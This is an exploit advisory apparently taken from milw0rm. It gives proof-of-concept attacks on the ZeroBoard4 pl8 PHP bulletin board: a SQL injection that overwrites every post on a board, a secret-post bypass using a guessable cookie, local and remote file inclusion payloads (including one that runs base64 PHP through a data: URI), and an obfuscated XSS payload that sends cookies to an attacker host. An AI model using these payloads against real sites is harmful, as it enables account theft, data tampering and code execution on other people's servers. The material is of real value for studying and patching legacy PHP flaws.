@@ -1,0 +1,147 @@
+ZeroBoard4 pl8 (07.12.17) Multiple Remote/Local Vulnerability 
+bY make0day@gmail.com
+thx to : Flyh4t
+/*************************
+
+ZeroBoard4 (VERSION pl8 (07.12.17))is most famous and widely used bulletin board system of Korea.
+It is freely available for all platforms that supports PHP and MySQL.
+There are Remote File Inclusion(?), Local File Inclusion, Blind sql injection vulnerability 
+XSS, and Secret post view Vulnerability.
+As I know, ZeroBoard4 will not be updated anymore because of zb developer start new project
+that was called zbxe. If you still use zb4, U d better update to XE! :-) 
+Here is the details:
+
+**************************/
+TEST ON VERSION ZeroBoard4 pl8 (07.12.17)
+Download : http://www.zeroboard.com
+/***************************
+[0x01] Blind SQL Injection Vulnerability
+
+/wrtie_ok.php
+
+<?
+	//set_time_limit(0); 
+
+	include "_head.php";
+
+¡Š¡Š
+
+@mysql_query("update $t_board"."_$id set headnum='$headnum',prev_no='$prev_no',next_no='$next_no',
+	 child='$child',depth='$depth',arrangenum='$arrangenum',father='$father',name='$name',email='$email',
+	homepage='$homepage',subject='$subject',memo='$memo',sitelink1='$sitelink1',sitelink2='$sitelink2'
+	,use_html='$use_html',reply_mail='$reply_mail',is_secret='$is_secret',category='$category' 
+	$del_que1 $del_que2 where no='$no'") or error(mysql_error()); 
+	//del_que1 and del_qu2 wern`t initialized
+
+*************************/
+
+poc:
+Well, I`m so lazy person :-(
+I didn`t make a exploit about this vuln.
+BTW, Do you know what is the most important thing?
+Attacker can control all post in same board!
+For example :]
+		when attacker set his own post like this :
+		title : hola brotha!
+		content : Itz party time!
+		del_que1 : 1 or 1=1--
+
+All post in the same board will be setted same as attacker`s one
+Yeah.. Itz very bad news :-|
+
+/***************************
+[0x02] Secret post view Auth bypass Vulnerability
+
+/view.php
+	//When someone write a post, cookie will be seted
+	$secret_str = $setup[no]."_".$no;
+	@setcookie("zb_s_check",$secret_str);
+	//zb_s_check is just a post number
+	
+
+/write.php
+
+	//When someone trying to modify his own post,
+	//Permission is checked right this: 
+
+¡Š¡Š
+
+if($mode=="modify") {
+
+		if($data[is_secret]&&!$is_admin&&$data[ismember]!=$member[no]
+		&&$HTTP_COOKIE_VARS[zb_s_check]!=$setup[no]."_".$no) error("Á€»óÀûÀÎ ¹æ¹ýÀž·Î ŒöÁ€ÇÏŒŒ¿ä");
+
+		//If zb_s_check == no than that it will be bypassed
+
+
+*************************/
+
+poc:
+No exploit is needed
+
+/***************************
+[0x03] Local file Inclusion Vulnerability
+
+/include/write.php
+
+if(eregi(":\/\/",$dir)||eregi("\.\.",$dir)) $dir ="./"; //....:)
+
+...
+
+include $dir."/write.php";
+
+//write.php filter :// and .. 
+//When we use absolute path, we can bypass filtering! :)
+
+*************************/
+
+poc:
+dir=C:/Apache/htdocs/bbs/data/board1/make0day.txt%00
+
+or
+
+//If you have same account in that server
+
+dir=/tmp
+
+//And Flyh4t said, at some windows server we can ignore '/write.php'
+//By using many '/'. 
+//Maybe you can find a clue from below :
+
+<?php
+$a='';
+for($i=0;$i<=4071;$i++) {
+        $a .= '/';
+}
+$a = 'test.txt'.$a;                   require_once($a.'.php');
+?>
+
+/***************************
+[0x04] XSS
+
+poc:
+<img src="make0day" width=0 height=0>
+<img src="make0day" onError=((document.all.tags('img')[0]).src='http://attack.com/c.php?c='+(eval(('D'+'o'+'C'+'u'+'M'+'e'+'N'+'t'+'.'+'C'+'o'+'O'+'k'+'I'+'e').toLowerCase()))) width=0 height=0>
+//GNUBoard final version is also insecure.
+
+/***************************
+[0x05] Remote file Inclusion Vulnerability
+
+/include/print_category.php
+
+if(eregi(":\/\/",$dir)||eregi("^\.",$dir)) $dir ="./"; //Filtering
+
+.....
+
+include "$dir/category_main.php";
+
+//They just filtering :// and .
+//It looks so perfect to detect RFI
+//but with php 5.2 & allow_url_include & register_globals that filtering is not secure
+//By using data:;, we can execute some arbitary php command without %00 
+*************************/
+
+poc:
+/include/print_category.php?setup[use_category]=1&dir=data:;base64,PD9waHBpbmZvKCk7Lyo=
+
+# milw0rm.com [2009-02-06]
